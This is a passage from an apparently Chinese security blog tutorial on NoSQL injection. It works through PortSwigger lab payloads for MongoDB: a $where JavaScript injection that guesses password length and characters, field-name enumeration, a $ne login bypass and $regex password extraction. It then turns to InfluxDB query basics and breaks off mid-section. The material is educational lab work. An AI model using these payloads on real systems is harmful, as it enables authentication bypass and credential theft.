+尽管题目给了admin的账户名，但是对于实战当中我们是没办法知道用户名的，所以我还是以winter这个account做例子
+playload：
+<a href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27" target="_blank" rel="noopener noreferrer">https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a>  &amp;&amp; this.password.length &lt; 30 || &lsquo;a&rsquo;=&lsquo;b
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql10.png"
+        srcset="/img/nosql-inject/nosql10.png, /img/nosql-inject/nosql10.png 1.5x, /img/nosql-inject/nosql10.png 2x"
+        alt="/img/nosql-inject/nosql10.png"
+        title="/img/nosql-inject/nosql10.png" ></figure>
+<a href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27" target="_blank" rel="noopener noreferrer">https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a>  &amp;&amp; this.password.length &lt; 0 || &lsquo;a&rsquo;=&lsquo;b
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql11.png"
+        srcset="/img/nosql-inject/nosql11.png, /img/nosql-inject/nosql11.png 1.5x, /img/nosql-inject/nosql11.png 2x"
+        alt="/img/nosql-inject/nosql11.png"
+        title="/img/nosql-inject/nosql11.png" ></figure>
+所以这里看见是可以对长度进行判断的，比如我们的密码是<code>peter</code>也就是5位那我们构造下length ==5也是为真的。
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql12.png"
+        srcset="/img/nosql-inject/nosql12.png, /img/nosql-inject/nosql12.png 1.5x, /img/nosql-inject/nosql12.png 2x"
+        alt="/img/nosql-inject/nosql12.png"
+        title="/img/nosql-inject/nosql12.png" ></figure>
+接下来可以利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">winter</span><span class="s1">&#39; &amp;&amp; this.password\[0\]=\=&#39;</span><span class="nx">a</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进行猜密码，这里可以写脚本也可以burp启动
+这里就放出一些例子的图片，不多说明
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql13.png"
+        srcset="/img/nosql-inject/nosql13.png, /img/nosql-inject/nosql13.png 1.5x, /img/nosql-inject/nosql13.png 2x"
+        alt="/img/nosql-inject/nosql13.png"
+        title="/img/nosql-inject/nosql13.png" ></figure>
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql14.png"
+        srcset="/img/nosql-inject/nosql14.png, /img/nosql-inject/nosql14.png 1.5x, /img/nosql-inject/nosql14.png 2x"
+        alt="/img/nosql-inject/nosql14.png"
+        title="/img/nosql-inject/nosql14.png" ></figure></p>
+<h4 id="识别字段名称" class="headerLink">
+    <a href="#%e8%af%86%e5%88%ab%e5%ad%97%e6%ae%b5%e5%90%8d%e7%a7%b0" class="header-mark"></a>识别字段名称</h4><p>由于 MongoDB 处理不需要固定架构的半结构化数据，因此您可能需要先识别集合中的有效字段，然后才能使用 JavaScript 注入提取数据。</p>
+<p>例如，要识别MongoDB数据库是否包含字段<code>password</code>，您可以提交以下有效负载：</p>
+<pre><code>https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
+</code></pre>
+<p>再次发送现有字段和不存在字段的有效负载。在此示例中，您知道该<code>username</code>字段存在，因此您可以发送以下有效负载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39; &amp;&amp; this.username!=&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39; &amp;&amp; this.foo!=&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果该<code>password</code>字段存在，您会期望响应与现有字段 ( ) 的响应相同<code>username</code>，但与不存在字段 ( <code>foo</code>) 的响应不同。</p>
+<p>如果您想测试不同的字段名称，您可以通过使用单词列表循环不同的潜在字段名称来执行字典攻击。</p>
+<h3 id="利用nosql运算符注入来提取数据" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8nosql%e8%bf%90%e7%ae%97%e7%ac%a6%e6%b3%a8%e5%85%a5%e6%9d%a5%e6%8f%90%e5%8f%96%e6%95%b0%e6%8d%ae" class="header-mark"></a>利用NoSQL运算符注入来提取数据</h3><p>假设有一个接受的程序：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="o">:</span><span class="s2">&#34;wiener&#34;</span><span class="p">,</span><span class="s2">&#34;password&#34;</span><span class="o">:</span><span class="s2">&#34;peter&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>要测试是否可以注入运算符，您可以尝试将<code>$where</code>运算符添加为附加参数，然后发送一个条件计算结果为 false 的请求，以及另一个计算结果为 true 的请求。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;wiener&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;peter&#34;</span><span class="p">,</span> <span class="nt">&#34;$where&#34;</span><span class="p">:</span><span class="s2">&#34;0&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;wiener&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;peter&#34;</span><span class="p">,</span> <span class="nt">&#34;$where&#34;</span><span class="p">:</span><span class="s2">&#34;1&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">如果存在差异，则存在注入</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="提取字段名称" class="headerLink">
+    <a href="#%e6%8f%90%e5%8f%96%e5%ad%97%e6%ae%b5%e5%90%8d%e7%a7%b0" class="header-mark"></a>提取字段名称</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="si">$where</span><span class="s2">&#34;</span><span class="o">:</span><span class="s2">&#34;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这将检查用户对象中的第一个数据字段并返回字段名称的第一个字符。这使您能够逐字符提取字段名称</p>
+<h3 id="lab" class="headerLink">
+    <a href="#lab" class="header-mark"></a>lab</h3><p>首先说一下大概的思路，也就是利用前面的{$ne:&rsquo;&rsquo;}构造一个万能密码，会发现登录不了也就是（Account locked）需要reset password，这个时候我们直接利用语句<code>&quot;$where&quot;:&quot;Object.keys(this)[1].match('^.{}.*')&quot;</code>来获取json的名称，类似于</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;xxxxx&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;xxxxxx&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;forgetPWD&#34;</span><span class="p">:</span><span class="s2">&#34;xxxxx&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>中的username,password，我们给对方的邮箱发送重置密码，然后利用上面的语句查出来我们需要的东西是在第几个key之中（其实就是判断他是否存在这个东西）例如这里的forgetpwd就是key[3]我们需要里面的值就可以再使用语句：&quot;$where&quot;:&ldquo;this.forgetPWD.match(&rsquo;^.{1}1.*&rsquo;)&ldquo;在数字一填入参数来进行爆破最终获取数据，因为我这里的lab响应太慢了我这里直接放一个视频链接可以去看看具体操作 :  <a href="https://www.youtube.com/watch?v=fyOzoqd2hl4" target="_blank" rel="noopener noreferrer">https://www.youtube.com/watch?v=fyOzoqd2hl4</a></p>
+<h2 id="javascript运算符提取数据" class="headerLink">
+    <a href="#javascript%e8%bf%90%e7%ae%97%e7%ac%a6%e6%8f%90%e5%8f%96%e6%95%b0%e6%8d%ae" class="header-mark"></a>javascript运算符提取数据</h2><p>或者，您也可以使用无法运行 JavaScript 的运算符来提取数据。例如，您可以使用 <code>$regex</code>运算符逐字符提取数据。</p>
+<p>考虑一个易受攻击的应用程序，它接受请求正文中的用户名和密码<code>POST</code>。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;myuser&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;mypass&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>您可以首先测试运算符是否<code>$regex</code>被处理，如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span><span class="s2">&#34;^.*&#34;</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果对此请求的响应与您提交错误密码时收到的响应不同，则表明该应用程序可能存在漏洞。您可以使用<code>$regex</code>运算符逐字符提取数据。例如，以下有效负载检查密码是否以 开头 <code>a</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:{</span><span class="nt">&#34;$regex&#34;</span><span class="p">:</span><span class="s2">&#34;^a*&#34;</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然原理是一样的
+以上的注入都是基于mangodb的语法，接下来是一种（权新版本）</p>
+<hr>
+<h1 id="influxdb" class="headerLink">
+    <a href="#influxdb" class="header-mark"></a>InfluxDB</h1><p>在正式注入之前，我们先要了解一些关于influxdb必要的知识（主要是这个数据库确实比较冷门，但是不排除ctf会考）</p>
+<h2 id="什么是influxdb" class="headerLink">
+    <a href="#%e4%bb%80%e4%b9%88%e6%98%afinfluxdb" class="header-mark"></a>什么是InfluxDB</h2><p>InfluxDB 是一种流行的开源时间序列数据库，旨在处理大量带时间戳的数据。InfluxDB 广泛用于监控和分析来自传感器、应用程序和物联网设备等各种来源的指标、事件和实时数据。</p>
+<h2 id="influxdb的数据组织" class="headerLink">
+    <a href="#influxdb%e7%9a%84%e6%95%b0%e6%8d%ae%e7%bb%84%e7%bb%87" class="header-mark"></a>influxDB的数据组织</h2><p>InfluxDB 数据模型将时间序列数据组织到存储桶和测量中。一个桶可以包含多个测量值。测量包含多个标签和字段。</p>
+<ul>
+<li><strong>Bucket</strong>：存储时间序列数据的指定位置。一个桶可以包含多个_测量值_。
+<ul>
+<li><strong>测量</strong>：时间序列数据的逻辑分组。给定测量中的所有_点都应具有相同的__标签_。一个测量包含多个_标签_和_字段_。
+<ul>
+<li><strong>Tags</strong>：键值对，其值不同，但不经常更改。标签用于存储每个点的元数据 - 例如，用于识别数据源（如主机、位置、站点等）的东西。</li>
+<li><strong>字段</strong>：键值对，其值随时间变化，例如：温度、压力、股票价格等。</li>
+<li><strong>Timestamp</strong>：与数据关联的时间戳。当存储在磁盘上并查询时，所有数据都按时间排序。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="写入数据的一些操作" class="headerLink">
+    <a href="#%e5%86%99%e5%85%a5%e6%95%b0%e6%8d%ae%e7%9a%84%e4%b8%80%e4%ba%9b%e6%93%8d%e4%bd%9c" class="header-mark"></a>写入数据的一些操作</h2><p>首先，我们要知道——写入influxdb的数据都是通过一个叫做 <strong>line protocol</strong>（翻译叫做线路协议，感觉翻译的不是很好，所以就直接拿出来，以下简称:LP）
+在官方文档中举了一个例子：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Syntax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">measurement</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="nx">tag_key</span><span class="o">&gt;=&lt;</span><span class="nx">tag_value</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="nx">tag_key</span><span class="o">&gt;=&lt;</span><span class="nx">tag_value</span><span class="o">&gt;</span><span class="p">]]</span> <span class="o">&lt;</span><span class="nx">field_key</span><span class="o">&gt;=&lt;</span><span class="nx">field_value</span><span class="o">&gt;</span><span class="p">[,</span><span class="o">&lt;</span><span class="nx">field_key</span><span class="o">&gt;=&lt;</span><span class="nx">field_value</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">&lt;</span><span class="nx">timestamp</span><span class="o">&gt;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Example
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">myMeasurement</span><span class="p">,</span><span class="nx">tag1</span><span class="o">=</span><span class="nx">value1</span><span class="p">,</span><span class="nx">tag2</span><span class="o">=</span><span class="nx">value2</span> <span class="nx">fieldKey</span><span class="o">=</span><span class="s2">&#34;fieldValue&#34;</span> <span class="mi">1556813561098000000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>官方文档还提示到：
+Line protocol does not support the newline character <code>\n</code> in tag or field values.
+也就是<code>\n</code>不支持转义为换行符，而是代表一个单独的point
+关于这个协议的一些要素
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql15.png"
+        srcset="/img/nosql-inject/nosql15.png, /img/nosql-inject/nosql15.png 1.5x, /img/nosql-inject/nosql15.png 2x"
+        alt="/img/nosql-inject/nosql15.png"
+        title="/img/nosql-inject/nosql15.png" ></figure></p>
+<h3 id="measurement" class="headerLink">
+    <a href="#measurement" class="header-mark"></a>measurement</h3><p>必须存在，且每一个数据点仅接受一个measurement，并且遵循命名规则：
+Measurement names, tag keys, and field keys cannot begin with an underscore <code>_</code>. The <code>_</code> namespace is reserved for InfluxDB system use.
+它的数据类型为：string</p>
+<h3 id="tag-set" class="headerLink">
+    <a href="#tag-set" class="header-mark"></a>Tag set</h3><p>【不为必须，可选】该点的所有标签键值对。键值关系用<code>=</code>操作数表示。多个标签键值对以逗号分隔。 _标签键和标签值区分大小写。标签键受到命名限制。标签值不能为空；相反，从标签集中省略该标签。
+数据类型：string</p>
+<h3 id="field-set" class="headerLink">
+    <a href="#field-set" class="header-mark"></a>Field set</h3><p>必须存在，和measurement一样，必须存在至少一个field，字段键和字符串值区分大小写，同样受到命名限制。
+数据类型：对于键名：string
+对于值：FLOAT INTEGER ULINTEGER STRING BOOLEAN</p>
+<p>example(双引号表示filed的值):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">measurementName <span class="nv">fieldKey</span><span class="o">=</span><span class="s2">&#34;field string value&#34;</span> <span class="m">1556813561098000000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="timestamp" class="headerLink">
+    <a href="#timestamp" class="header-mark"></a>Timestamp</h3><p>【可选择的】也就是我们常说的时间戳。InfluxDB 接受每个点一个时间戳。如果未提供时间戳，InfluxDB 将使用其主机的系统时间 (UTC)。
+数据类型：Unix Timestamp</p>
+<h4 id="关于时间戳的重要说明from-docs" class="headerLink">
+    <a href="#%e5%85%b3%e4%ba%8e%e6%97%b6%e9%97%b4%e6%88%b3%e7%9a%84%e9%87%8d%e8%a6%81%e8%af%b4%e6%98%8efrom-docs" class="header-mark"></a>关于时间戳的重要说明(from docs)</h4><ul>
+<li>为了确保数据点包含观察指标的时间（未由 InfluxDB 接收），请包含时间戳。</li>
+<li>如果您的时间戳不是纳秒，请在将数据写入 InfluxDB时指定时间戳的精度。</li>
+</ul>
+<h3 id="其他的一些东西" class="headerLink">
+    <a href="#%e5%85%b6%e4%bb%96%e7%9a%84%e4%b8%80%e4%ba%9b%e4%b8%9c%e8%a5%bf" class="header-mark"></a>其他的一些东西</h3><h4 id="quotes单引号" class="headerLink">
+    <a href="#quotes%e5%8d%95%e5%bc%95%e5%8f%b7" class="header-mark"></a>Quotes(单引号)</h4><table>
+<thead>
+<tr>
+<th>Element</th>
+<th>Double quotes</th>
+<th>Single quotes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Measurement</td>
+<td><em>Limited</em> *</td>
+<td><em>Limited</em> *</td>
+</tr>
+<tr>
+<td>Tag key</td>
+<td><em>Limited</em> *</td>
+<td><em>Limited</em> *</td>
+</tr>
+<tr>
+<td>Tag value</td>
+<td><em>Limited</em> *</td>
+<td><em>Limited</em> *</td>
+</tr>
+<tr>
+<td>Field key</td>
+<td><em>Limited</em> *</td>
+<td><em>Limited</em> *</td>
+</tr>
+<tr>
+<td>Field value</td>
+<td><strong>Strings only</strong></td>
+<td>Never</td>
+</tr>
+<tr>
+<td>Timestamp</td>
+<td>Never</td>
+<td>Never</td>
+</tr>
+</tbody>
+</table>
+<h4 id="special-characters一些特殊的字符" class="headerLink">
+    <a href="#special-characters%e4%b8%80%e4%ba%9b%e7%89%b9%e6%ae%8a%e7%9a%84%e5%ad%97%e7%ac%a6" class="header-mark"></a>Special Characters(一些特殊的字符<code>\</code>)</h4><p>在以下情况下，需要使用反斜杠 ( <code>\</code>) 转义某些字符</p>
+<table>
+<thead>
+<tr>
+<th>Element</th>
+<th>Escape characters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Measurement</td>
+<td>Comma, Space</td>
+</tr>
+<tr>
+<td>Tag key</td>
+<td>Comma, Equals Sign, Space</td>
+</tr>
+<tr>
+<td>Tag value</td>
+<td>Comma, Equals Sign, Space</td>
+</tr>
+<tr>
+<td>Field key</td>
+<td>Comma, Equals Sign, Space</td>
+</tr>
+<tr>
+<td>Field value</td>
+<td>Double quote, Backslash</td>
+</tr>
+</tbody>
+</table>
+<h3 id="model-of-lp" class="headerLink">
+    <a href="#model-of-lp" class="header-mark"></a>model of LP</h3><p>关于这个LP，官方也给出了一个模型，可以用来构建一个LP</p>
+<ul>
+<li><strong>measurement</strong>: <code>home</code>
+<ul>
+<li><strong>tags</strong>
+<ul>
+<li><code>room</code>: Living Room or Kitchen</li>
+</ul>
+</li>
+<li><strong>fields</strong>
+<ul>
+<li><code>temp</code>: temperature in °C (float)</li>
+<li><code>hum</code>: percent humidity (float)</li>
+<li><code>co</code>: carbon monoxide in parts per million (integer)</li>
+</ul>
+</li>
+<li><strong>timestamp</strong>: Unix timestamp in <em>second</em> precision</li>
+</ul>
+</li>
+</ul>
+<h2 id="查询的操作" class="headerLink">
+    <a href="#%e6%9f%a5%e8%af%a2%e7%9a%84%e6%93%8d%e4%bd%9c" class="header-mark"></a>查询的操作</h2><p>两种查询语言：</p>
+<ul>
+<li><strong>Flux</strong>：一种函数式脚本语言，旨在查询和处理来自 InfluxDB 和其他数据源的数据。</li>
+<li><strong>InfluxQL</strong>：一种类似 SQL 的查询语言，旨在从 InfluxDB 查询时间序列数据。</li>
+</ul>
+<h3 id="flux语法" class="headerLink">
+    <a href="#flux%e8%af%ad%e6%b3%95" class="header-mark"></a>Flux语法</h3><h4 id="基本格式" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%ac%e6%a0%bc%e5%bc%8f" class="header-mark"></a>基本格式</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">from</span><span class="p">(</span><span class="nx">bucket</span><span class="o">:</span> <span class="s2">&#34;example-bucket&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="nx">d</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_measurement</span> <span class="o">==</span> <span class="s2">&#34;example-measurement&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">mean</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="k">yield</span><span class="p">(</span><span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;_results&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>from(): 从哪个bucket中查询</li>
+<li>range(): 根据时间范围过滤数据。Flux 需要“有界”查询——仅限于特定时间范围的查询。</li>
+<li>filter(): 根据列值过滤数据。每行由 表示<code>r</code> ，每列由 的属性表示<code>r</code>。可以使用多个过滤器.</li>
+<li>yield():输出。</li>
+<li>mean():计算每个输入表的列中非空值的平均值<code>_value</code></li>
+</ul>
+<h4 id="pipe-forward-operator管道转发符" class="headerLink">
+    <a href="#pipe-forward-operator%e7%ae%a1%e9%81%93%e8%bd%ac%e5%8f%91%e7%ac%a6" class="header-mark"></a>Pipe-forward operator(管道转发符)</h4><p>Flux 使用管道转发运算符 ( <code>|&gt;</code>) 将一个函数的输出作为输入传递到下一个函数作为输入。
+docs也是举了一个例子1:
+以下 Flux 查询返回存储在<strong>家庭测量中的</strong> <strong>co</strong>、<strong>hum</strong>和<strong>temp</strong>字段，其时间戳<strong>在 2022-01-01T08:00:00Z 和 2022-01-01T20:00:01Z 之间</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">from</span><span class="p">(</span><span class="nx">bucket</span><span class="o">:</span> <span class="s2">&#34;get-started&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">range</span><span class="p">(</span><span class="nx">start</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="nx">T08</span><span class="o">:</span><span class="mi">00</span><span class="o">:</span><span class="mi">00</span><span class="nx">Z</span><span class="p">,</span> <span class="nx">stop</span><span class="o">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="nx">T20</span><span class="o">:</span><span class="mi">00</span><span class="o">:</span><span class="mi">01</span><span class="nx">Z</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_measurement</span> <span class="o">==</span> <span class="s2">&#34;home&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">|&gt;</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">fn</span><span class="o">:</span> <span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span><span class="o">==</span> <span class="s2">&#34;co&#34;</span> <span class="nx">or</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span> <span class="o">==</span> <span class="s2">&#34;hum&#34;</span> <span class="nx">or</span> <span class="nx">r</span><span class="p">.</span><span class="nx">_field</span> <span class="o">==</span> <span class="s2">&#34;temp&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="influxql语法" class="headerLink">
+    <a href="#influxql%e8%af%ad%e6%b3%95" class="header-mark"></a>influxQL语法</h3><p>InfluxQL 是一种类 SQL 查询语言，与大多数 SQL 语言类似，但专门设计用于查询 InfluxDB 0.x 和 1.x 中的时间序列数据。</p>
+<h4 id="基本的查询知识" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%ac%e7%9a%84%e6%9f%a5%e8%af%a2%e7%9f%a5%e8%af%86" class="header-mark"></a>基本的查询知识</h4><ul>
+<li><code>SELECT</code>: 指定要查询的字段和标签。</li>
+<li><code>FROM</code>: 指定要查询的测量值。使用测量名称或包含数据库和保留策略的完全限定测量名称。例如：<code>db.rp.measurement</code>。</li>
+<li><code>WHERE</code>: (可选）根据字段、标签和时间过滤数据。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">co</span><span class="p">,</span><span class="n">hum</span><span class="p">,</span><span class="n">temp</span><span class="p">,</span><span class="n">room</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s2">&#34;get-started&#34;</span><span class="p">.</span><span class="n">autogen</span><span class="p">.</span><span class="n">home</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="s1">&#39;2022-01-01T08:00:00Z&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">time</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="s1">&#39;2022-01-01T20:00:00Z&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实就和sql语句差不多.</p>
+<h2 id="注入利用" class="headerLink">
+    <a href="#%e6%b3%a8%e5%85%a5%e5%88%a9%e7%94%a8" class="header-mark"></a>注入利用</h2><p>经过上面基础知识的学习，想必你已经有了一定的概念，那么我们就开始利用吧</p>
+<h3 id="构建一个易被攻击的web" class="headerLink">
+    <a href="#%e6%9e%84%e5%bb%ba%e4%b8%80%e4%b8%aa%e6%98%93%e8%a2%ab%e6%94%bb%e5%87%bb%e7%9a%84web" class="header-mark"></a>构建一个易被攻击的web</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
